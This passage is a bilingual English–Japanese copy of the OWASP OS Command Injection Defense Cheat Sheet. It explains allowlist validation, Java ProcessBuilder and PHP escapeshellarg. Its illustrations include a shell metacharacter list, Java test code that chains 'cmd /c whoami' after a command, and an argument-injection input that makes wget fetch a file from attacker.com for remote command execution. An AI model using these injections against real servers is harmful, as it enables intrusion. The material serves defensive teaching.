
**Input validation:** The values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 第 2 層

**入力検証:** コマンドと関連する引数の値は、どちらも検証する必要があります。実際のコマンドとその引数には、検証の程度に違いがあります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

- When it comes to the **commands** used, these must be validated against a list of allowed commands.
- In regards to the **arguments** used for these commands, they should be validated using the following options:
    - **Positive or allowlist input validation**: Where are the arguments allowed explicitly defined.
    - **Allowlist Regular Expression**: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in `Note A` and whitespaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: `^[a-z0-9]&#123;3,10&#125;$`
- According to **Guideline 10** of this [POSIX](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html), *The first -- argument that is not an option-argument should be accepted as a delimiter indicating the end of options. Any following arguments should be treated as operands, even if they begin with the '-' character.* For example, `curl -- $url` will prevent an argument injection even if the `$url` is malformed and contains an additional argument.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

- 使用される **コマンド** については、許可されたコマンドのリストと照合して検証する必要があります。
- これらのコマンドに使用される **引数** については、次の選択肢を使って検証すべきです。
    - **ポジティブ入力検証または許可リスト入力検証**: 許可される引数を明示的に定義します。
    - **許可リスト正規表現**: 良好で許可された文字のリストと、文字列の最大長を定義します。`Note A` で指定されているようなメタ文字や空白文字が正規表現に含まれないようにしてください。たとえば、次の正規表現は小文字と数字のみを許可し、メタ文字を含みません。また、長さも 3 から 10 文字に制限されています: `^[a-z0-9]&#123;3,10&#125;$`
- この [POSIX](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html) の **Guideline 10** によれば、オプション引数ではない最初の `--` 引数は、オプションの終端を示す区切りとして受け入れるべきです。以降の引数は、たとえ `-` 文字で始まっていてもオペランドとして扱うべきです。たとえば、`curl -- $url` は、`$url` が不正で追加引数を含む場合でも、引数インジェクションを防ぎます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**Note A:**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**Note A:**

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
& |  ; $ > < ` \ ! ' " ( )
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Additional Defenses

On top of primary defenses, parameterizations, and input validation, we also recommend adopting all of these additional defenses to provide defense in depth.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## 追加の防御策

主な防御策、パラメータ化、入力検証に加えて、多層防御を実現するため、これらすべての追加防御策を採用することも推奨します。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

These additional defenses are:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

追加防御策は次のとおりです。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

- Applications should run using the lowest privileges that are required to accomplish the necessary tasks.
- If possible, create isolated accounts with limited privileges that are only used for a single task.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

- アプリケーションは、必要なタスクを実行するために必要な最小権限で実行すべきです。
- 可能であれば、単一のタスクにのみ使用する、権限を制限した分離アカウントを作成します。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Code examples

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## コード例

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Java

In Java, use [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) and the command must be separated from its arguments.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Java

Java では [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) を使用し、コマンドとその引数を分離する必要があります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

*Note about the Java's `Runtime.exec` method behavior:*

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

*Java の `Runtime.exec` メソッドの挙動に関する注記:*

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

There are many sites that will tell you that Java's `Runtime.exec` is exactly the same as `C`'s system function. This is not true. Both allow you to invoke a new program/process.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

Java の `Runtime.exec` は `C` の system 関数とまったく同じだと説明しているサイトが多数あります。これは正しくありません。どちらも新しいプログラムまたはプロセスを起動できます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

However, `C`'s system function passes its arguments to the shell (`/bin/sh`) to be parsed, whereas `Runtime.exec` tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

しかし、`C` の system 関数は引数をシェル (`/bin/sh`) に渡して解析させます。一方、`Runtime.exec` は文字列を単語の配列に分割し、配列の最初の単語を実行し、残りの単語をパラメータとして渡そうとします。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**`Runtime.exec` does NOT try to invoke the shell at any point and does not support shell metacharacters**.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**`Runtime.exec` はどの時点でもシェルを起動しようとせず、シェルメタ文字をサポートしません**。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using  `&`, `&&`, `|`, `||`, etc,  redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

重要な違いは、悪用に使われ得るシェルの多くの機能 (たとえば `&`、`&&`、`|`、`||` などを使ったコマンド連結、入力や出力のリダイレクト) が、単に最初のコマンドへ渡されるパラメータになってしまい、構文エラーになるか、無効なパラメータとして破棄される可能性が高いことです。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

*Code to test the note above:*

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

*上記の注記を検証するコード:*

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```java
String[] specialChars = new String[]{"&", "&&", "|", "||"};
String payload = "cmd /c whoami";
String cmdTemplate = "java -version %s " + payload;
String cmd;
Process p;
int returnCode;
for (String specialChar : specialChars) {
    cmd = String.format(cmdTemplate, specialChar);
    System.out.printf("#### TEST CMD: %s\n", cmd);
    p = Runtime.getRuntime().exec(cmd);
    returnCode = p.waitFor();
    System.out.printf("RC    : %s\n", returnCode);
    System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                      "utf-8"));
    System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                      "utf-8"));
}
System.out.printf("#### TEST PAYLOAD ONLY: %s\n", payload);
p = Runtime.getRuntime().exec(payload);
returnCode = p.waitFor();
System.out.printf("RC    : %s\n", returnCode);
System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                  "utf-8"));
System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                  "utf-8"));
```text

```java
String[] specialChars = new String[]{"&", "&&", "|", "||"};
String payload = "cmd /c whoami";
String cmdTemplate = "java -version %s " + payload;
String cmd;
Process p;
int returnCode;
for (String specialChar : specialChars) {
    cmd = String.format(cmdTemplate, specialChar);
    System.out.printf("#### TEST CMD: %s\n", cmd);
    p = Runtime.getRuntime().exec(cmd);
    returnCode = p.waitFor();
    System.out.printf("RC    : %s\n", returnCode);
    System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                      "utf-8"));
    System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                      "utf-8"));
}
System.out.printf("#### TEST PAYLOAD ONLY: %s\n", payload);
p = Runtime.getRuntime().exec(payload);
returnCode = p.waitFor();
System.out.printf("RC    : %s\n", returnCode);
System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                  "utf-8"));
System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                  "utf-8"));
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

*Result of the test:*

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

*テスト結果:*

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
##### TEST CMD: java -version & cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version && cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version | cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version || cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST PAYLOAD ONLY: cmd /c whoami
RC    : 0
OUT   :
mydomain\simpleuser

ERROR :
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

*Incorrect usage:*

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

*誤った使用例:*

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```java
ProcessBuilder b = new ProcessBuilder("C:\DoStuff.exe -arg1 -arg2");
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

In this example, the command together with the arguments are passed as a one string, making it easy to manipulate that expression and inject malicious strings.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

この例では、コマンドと引数が 1 つの文字列として渡されています。そのため、この式を操作して悪意のある文字列を注入しやすくなります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

*Correct Usage:*

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

*正しい使用例:*

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Here is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This makes it easy to validate each term and reduces the risk of malicious strings being inserted.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

次の例は、変更された作業ディレクトリでプロセスを開始します。コマンドと各引数は個別に渡されます。これにより、各要素を検証しやすくなり、悪意のある文字列が挿入されるリスクを低減できます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```java
ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");

Map<String, String> env = pb.environment();

pb.directory(new File("TrustedDir"));

Process p = pb.start();
```text

```java
ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");

Map<String, String> env = pb.environment();

pb.directory(new File("TrustedDir"));

Process p = pb.start();
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### .Net

See relevant details in the [DotNet Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DotNet_Security_Cheat_Sheet.html#os-injection)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### .Net

関連する詳細は [DotNet Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DotNet_Security_Cheat_Sheet.html#os-injection) を参照してください。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### PHP

PHP exposes two helper functions when you must pass user input to a shell: `escapeshellarg()` and `escapeshellcmd()`.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### PHP

PHP では、ユーザー入力をシェルに渡す必要がある場合に使える 2 つのヘルパー関数、`escapeshellarg()` と `escapeshellcmd()` が提供されています。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

`escapeshellarg()`:  Ensures the user can pass only one parameter to the command, cannot add extra parameters, and cannot execute a different command.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`escapeshellarg()`: ユーザーがコマンドへ 1 つのパラメータだけを渡せるようにし、追加パラメータの追加や別コマンドの実行を防ぎます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

`escapeshellcmd()`: Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`escapeshellcmd()`: ユーザーが意図されたコマンドだけを実行できるようにし、無制限のパラメータを渡せる一方で、他のコマンドの実行を防ぎます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

It is always preferable to use `escapeshellarg()` rather than `escapeshellcmd()` when dealing with user input.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

ユーザー入力を扱う場合は、常に `escapeshellcmd()` よりも `escapeshellarg()` を使用することが望ましいです。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

For example, consider this code using `wget` with `escapeshellcmd()`:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

たとえば、`wget` と `escapeshellcmd()` を使う次のコードを考えます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . $url;
system(escapeshellcmd($command));
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

If the user provides:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

ユーザーが次の値を提供した場合を考えます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

`escapeshellcmd()` will still allow this extra parameter meaning the attacker can override the original `--directory-prefix` option, save the file in the current directory and then achieve remote command execution on the server.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`escapeshellcmd()` はこの追加パラメータを依然として許容します。つまり、攻撃者は元の `--directory-prefix` オプションを上書きし、ファイルを現在のディレクトリに保存させ、その後サーバー上でリモートコマンド実行を達成できます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The safe approach is to use `escapeshellarg()` so that the URL is treated as a single argument:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

安全なアプローチは、URL が単一の引数として扱われるように `escapeshellarg()` を使用することです。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);
system($command);
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Now the malicious input becomes:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

これにより、悪意のある入力は次のようになります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Here, the second `--directory-prefix` is part of the quoted string, not a real option, so the attack fails.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

ここでは、2 つ目の `--directory-prefix` はクォートされた文字列の一部であり、実際のオプションではないため、攻撃は失敗します。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

In addition, it is good security practice to follow these recommendations:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

さらに、次の推奨事項に従うことはセキュリティ上の良いプラクティスです。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

- **Hardcode the command**: never allow the user to choose which executable to run.
- **Hardcode options**: required flags (e.g., `--directory-prefix`) should be in the code, not in user input.
- **Validate and restrict input as much as possible**: apply strict validation rules, whitelists, and format checks to minimize the attack surface.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

- **コマンドをハードコードする**: 実行する実行ファイルをユーザーに選択させてはいけません。
- **オプションをハードコードする**: 必須フラグ (例: `--directory-prefix`) はユーザー入力ではなく、コード内に置くべきです。
- **入力を可能な限り検証し制限する**: 厳格な検証ルール、許可リスト、形式チェックを適用し、攻撃対象領域を最小化します。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Related articles

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## 関連記事

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Description of Command Injection Vulnerability

- OWASP [Command Injection](https://owasp.org/www-community/attacks/Command_Injection).

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### コマンドインジェクション脆弱性の説明

- OWASP [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### How to Avoid Vulnerabilities

- C Coding: [Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177).

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 脆弱性を避ける方法

- C Coding: [Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### How to Review Code

- OWASP [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/Reviewing_Code_for_OS_Injection).

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### コードレビューの方法

- OWASP [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/Reviewing_Code_for_OS_Injection)。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### How to Test

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) article on [Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.html).

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### テスト方法

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) の [Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.html) に関する記事。

</div>
</div>

<div className="bilingualPair">

<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 外部参照

- [CWE Entry 77 on Command Injection](https://cwe.mitre.org/data/definitions/77.html)。

</div>
</div>

</section>
</div>

## References

<div className="referenceFooter">

- [CWE Entry 77 on Command Injection](https://cwe.mitre.org/data/definitions/77.html).

</div>


## Attribution

<div className="attributionFooter">

- Original: OS Command Injection Defense Cheat Sheet
- Source: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- Copyright: Cheat Sheets Series Team
- License: Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
- License URL: https://creativecommons.org/licenses/by-sa/4.0/
- Changes: English original retained for comparison. Japanese translation added. Bilingual display generated from official source and local Japanese translation.
- Retrieved: 2026-05-20

</div>
